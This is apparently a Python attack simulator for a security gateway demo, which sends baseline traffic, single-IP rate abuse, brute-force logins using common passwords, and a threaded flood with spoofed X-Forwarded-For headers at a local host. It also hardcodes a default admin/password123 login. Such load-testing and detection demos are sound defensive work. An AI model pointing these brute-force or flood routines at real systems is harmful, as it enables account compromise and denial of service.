#!/usr/bin/env python3
from typing import Optional
"""
╔══════════════════════════════════════════════════════╗
║          SecOps Gateway - Attack Simulator           ║
║  Demonstrates: Rate Abuse, Brute Force, DoS Attack  ║
╚══════════════════════════════════════════════════════╝

Usage:
  python attack.py [mode] [options]

Modes:
  normal      - Legitimate traffic at ~5 req/s (baseline)
  rate_abuse  - One IP hammering /api → triggers RATE_ABUSE + block
  brute_force - Repeated bad credential attempts → triggers BRUTE_FORCE
  dos         - Distributed flood from many IPs → triggers DOS_ATTACK
  demo        - Runs all modes sequentially for a full demonstration

Options:
  --host HOST   Gateway host (default: http://localhost:3000)
  --duration N  Seconds to run each attack (default: 10)
  --threads N   Threads for DoS mode (default: 50)
"""

import argparse
import threading
import time
import random
import sys
import json
from datetime import datetime

try:
    import requests
except ImportError:
    print("[!] Install requests:  pip install requests")
    sys.exit(1)

# ── ANSI Colors ────────────────────────────────────────────────────────────────
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
W = "\033[97m"; DIM = "\033[2m"; RESET = "\033[0m"; BOLD = "\033[1m"

# ── Shared counters (thread-safe via GIL for simple int ops) ───────────────────
counts = {"sent": 0, "ok": 0, "rate_lim": 0, "blocked": 0, "errors": 0}
lock   = threading.Lock()


def inc(key):
    with lock:
        counts[key] += 1


def log(emoji, color, msg):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"{DIM}[{ts}]{RESET} {emoji}  {color}{msg}{RESET}")


def banner(title, color=C):
    width = 56
    bar   = "═" * width
    print(f"\n{color}{BOLD}╔{bar}╗{RESET}")
    padded = title.center(width)
    print(f"{color}{BOLD}║{padded}║{RESET}")
    print(f"{color}{BOLD}╚{bar}╝{RESET}\n")


def status_summary():
    print(f"\n  {BOLD}── Summary ──────────────────────────────{RESET}")
    print(f"  Sent:        {W}{BOLD}{counts['sent']:>6}{RESET}")
    print(f"  OK (2xx):    {G}{BOLD}{counts['ok']:>6}{RESET}")
    print(f"  Rate-limited:{Y}{BOLD}{counts['rate_lim']:>6}{RESET}")
    print(f"  Blocked:     {R}{BOLD}{counts['blocked']:>6}{RESET}")
    print(f"  Errors:      {DIM}{counts['errors']:>6}{RESET}")
    print()


def reset_counts():
    with lock:
        for k in counts:
            counts[k] = 0


# ── Attack Modes ───────────────────────────────────────────────────────────────

def mode_normal(host: str, duration: int, **_):
    """Legitimate traffic: 5 req/s, with a valid JWT."""
    banner("MODE 1 — NORMAL TRAFFIC", G)
    print(f"  {G}Sending legitimate traffic at ~5 req/s for {duration}s{RESET}")
    print(f"  This is your baseline. Watch dashboard stay green.\n")

    # Get a valid JWT first
    token = get_token(host)
    headers = {"Authorization": f"Bearer {token}"} if token else {}

    end = time.time() + duration
    while time.time() < end:
        try:
            r = requests.get(f"{host}/api/posts/1", headers=headers, timeout=3)
            inc("sent")
            if r.status_code == 200:
                inc("ok")
                sys.stdout.write(f"{G}·{RESET}")
            else:
                inc("errors")
                sys.stdout.write(f"{Y}{r.status_code} {RESET}")
            sys.stdout.flush()
        except Exception as e:
            inc("errors")
        time.sleep(0.2)   # ~5 req/s
    print()
    status_summary()


def mode_rate_abuse(host: str, duration: int, **_):
    """Single IP hammers the API endpoint as fast as possible."""
    banner("MODE 2 — RATE ABUSE", Y)
    print(f"  {Y}One IP sending requests as fast as possible for {duration}s{RESET}")
    print(f"  Gateway threshold: 20 req/s (soft) → 40 req/s (block){RESET}\n")
    print(f"  {DIM}Watch the Threats panel → RATE_LIMIT → RATE_ABUSE → IP_BLOCKED{RESET}\n")

    token = get_token(host)
    headers = {"Authorization": f"Bearer {token}"} if token else {}

    end = time.time() + duration
    while time.time() < end:
        try:
            r = requests.get(f"{host}/api/posts", headers=headers, timeout=2)
            inc("sent")
            if r.status_code == 200:
                inc("ok"); sys.stdout.write(f"{G}·{RESET}")
            elif r.status_code == 429:
                inc("rate_lim"); sys.stdout.write(f"{Y}429 {RESET}")
            elif r.status_code == 403:
                inc("blocked"); sys.stdout.write(f"{R}BLOCKED {RESET}")
                time.sleep(0.5)   # Back off when blocked
            else:
                inc("errors"); sys.stdout.write(f"{DIM}{r.status_code} {RESET}")
            sys.stdout.flush()
        except Exception:
            inc("errors")
    print()
    status_summary()


def mode_brute_force(host: str, duration: int, **_):
    """Rapid credential guessing at /auth/login → triggers BRUTE_FORCE."""
    banner("MODE 3 — BRUTE FORCE LOGIN", M)
    print(f"  {M}Attempting rapid login with wrong credentials for {duration}s{RESET}")
    print(f"  Gateway threshold: 5 failed logins → BRUTE_FORCE alert{RESET}\n")
    print(f"  {DIM}Credentials tried: random usernames + common passwords{RESET}\n")

    common_passwords = ["123456", "password", "admin", "letmein", "qwerty", "abc123", "monkey", "1234567890"]
    fake_users       = ["root", "user", "test", "guest", "superuser", "operator", "sysadmin", "ubuntu"]

    end  = time.time() + duration
    attempt = 0
    while time.time() < end:
        username = random.choice(fake_users)
        password = random.choice(common_passwords)
        try:
            r = requests.post(
                f"{host}/auth/login",
                json={"username": username, "password": password},
                timeout=3
            )
            attempt += 1
            inc("sent")
            if r.status_code == 200:
                inc("ok")
                log("✅", G, f"Login SUCCESS!  {username}:{password}")
            elif r.status_code == 401:
                inc("rate_lim")
                if attempt % 5 == 0:
                    log("🔑", M, f"Attempt #{attempt:3d} → 401  ({username}:{password})")
            elif r.status_code == 429:
                inc("blocked")
                log("🚫", R, f"Rate-limited at attempt #{attempt}")
                time.sleep(0.3)
            sys.stdout.flush()
        except Exception:
            inc("errors")
        time.sleep(0.05)   # ~20 attempts/s
    print()
    status_summary()


def _flood_worker(host: str, end_time: float, fake_ip: str):
    """Worker thread for DoS — sends requests with spoofed X-Forwarded-For."""
    headers = {"X-Forwarded-For": fake_ip, "User-Agent": f"DDoS-Bot/{random.randint(1,99)}"}
    while time.time() < end_time:
        try:
            r = requests.get(f"{host}/api/posts", headers=headers, timeout=2)
            inc("sent")
            if   r.status_code == 200:  inc("ok")
            elif r.status_code == 429:  inc("rate_lim")
            elif r.status_code in (403, 503): inc("blocked")
            else:                       inc("errors")
        except Exception:
            inc("errors")


def mode_dos(host: str, duration: int, threads: int = 50, **_):
    """Distributed flood from many fake IPs → global DoS threshold."""
    banner("MODE 4 — DISTRIBUTED DoS FLOOD", R)
    print(f"  {R}Launching {threads} concurrent threads for {duration}s{RESET}")
    print(f"  Each thread uses a unique spoofed X-Forwarded-For IP{RESET}\n")
    print(f"  {DIM}Watch Dashboard → Traffic chart spike → DOS_ATTACK alerts{RESET}\n")

    end_time   = time.time() + duration
    fake_ips   = [f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(threads)]
    thread_list = []

    for ip in fake_ips:
        t = threading.Thread(target=_flood_worker, args=(host, end_time, ip), daemon=True)
        thread_list.append(t)
        t.start()

    # Progress bar while attack runs
    start  = time.time()
    while time.time() < end_time:
        elapsed = time.time() - start
        pct     = int((elapsed / duration) * 30)
        bar     = "█" * pct + "░" * (30 - pct)
        rps     = counts["sent"] / max(elapsed, 0.1)
        sys.stdout.write(f"\r  {R}[{bar}]{RESET}  {W}{BOLD}{rps:.0f} req/s{RESET}  "
                         f"sent={counts['sent']} blocked={counts['blocked']}  ")
        sys.stdout.flush()
        time.sleep(0.25)

    for t in thread_list:
        t.join(timeout=2)
    print("\n")
    status_summary()


def mode_demo(host: str, duration: int, threads: int, **_):
    """Full sequential demo — runs all 4 modes one after another."""
    banner("FULL DEMO — All Attack Modes", C)
    print(f"  {C}This will run all 4 attack modes sequentially.{RESET}")
    print(f"  {C}Open the dashboard at http://localhost:3000 and watch live.{RESET}\n")

    step_duration = max(duration, 8)

    for label, fn in [
        ("Normal Traffic (baseline)", mode_normal),
        ("Rate Abuse",                mode_rate_abuse),
        ("Brute Force Login",         mode_brute_force),
        ("Distributed DoS",           mode_dos),
    ]:
        print(f"\n{W}{BOLD}Next: {label} in 3 seconds…{RESET}")
        time.sleep(3)
        reset_counts()
        fn(host=host, duration=step_duration, threads=threads)
        print(f"{G}✔ Done. Pausing 5 seconds before next mode…{RESET}")
        time.sleep(5)

    banner("DEMO COMPLETE", G)
    print(f"  {G}All attack modes finished. Check the dashboard for a full replay.{RESET}\n")


# ── Helpers ────────────────────────────────────────────────────────────────────

def get_token(host: str) -> Optional[str]:
    """Authenticates with the gateway and returns a JWT."""
    try:
        r = requests.post(f"{host}/auth/login", json={"username": "admin", "password": "password123"}, timeout=5)
        if r.status_code == 200:
            token = r.json().get("token")
            log("🔐", G, f"JWT obtained successfully")
            return token
    except Exception:
        pass
    log("⚠️ ", Y, "Could not get JWT — proceeding without token (will trigger 401s)")
    return None


# ── Entry point ────────────────────────────────────────────────────────────────

MODES = {
    "normal":      mode_normal,
    "rate_abuse":  mode_rate_abuse,
    "brute_force": mode_brute_force,
    "dos":         mode_dos,
    "demo":        mode_demo,
}

def main():
    parser = argparse.ArgumentParser(
        description="SecOps Gateway — Attack Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument("mode", nargs="?", choices=list(MODES.keys()),
                        help="Attack mode to run")
    parser.add_argument("--host",     default="http://localhost:3000", help="Gateway URL")
    parser.add_argument("--duration", type=int, default=10,  help="Duration in seconds")
    parser.add_argument("--threads",  type=int, default=50,  help="Threads for DoS mode")
    args = parser.parse_args()

    if not args.mode:
        # Interactive menu
        banner("SecOps Gateway — Attack Simulator", C)
        print(f"  {W}Target: {BOLD}{args.host}{RESET}\n")
        print(f"  {B}[1]{RESET} Normal Traffic   — legitimate baseline")
        print(f"  {Y}[2]{RESET} Rate Abuse        — single IP flooding")
        print(f"  {M}[3]{RESET} Brute Force       — credential stuffing")
        print(f"  {R}[4]{RESET} DoS Attack        — distributed flood ({args.threads} threads)")
        print(f"  {C}[5]{RESET} Full Demo         — run all modes sequentially")
        print(f"  {DIM}[q]{RESET} Quit\n")

        choice = input(f"  {W}Select [{BOLD}1-5/q{RESET}{W}]: {RESET}").strip().lower()
        mode_map = {"1": "normal", "2": "rate_abuse", "3": "brute_force", "4": "dos", "5": "demo", "q": None}

        if choice not in mode_map or mode_map[choice] is None:
            print(f"\n  {DIM}Exiting.{RESET}\n")
            return

        args.mode = mode_map[choice]

    fn = MODES[args.mode]
    try:
        fn(host=args.host, duration=args.duration, threads=args.threads)
    except KeyboardInterrupt:
        print(f"\n\n  {Y}Interrupted by user.{RESET}")
        status_summary()


if __name__ == "__main__":
    main()
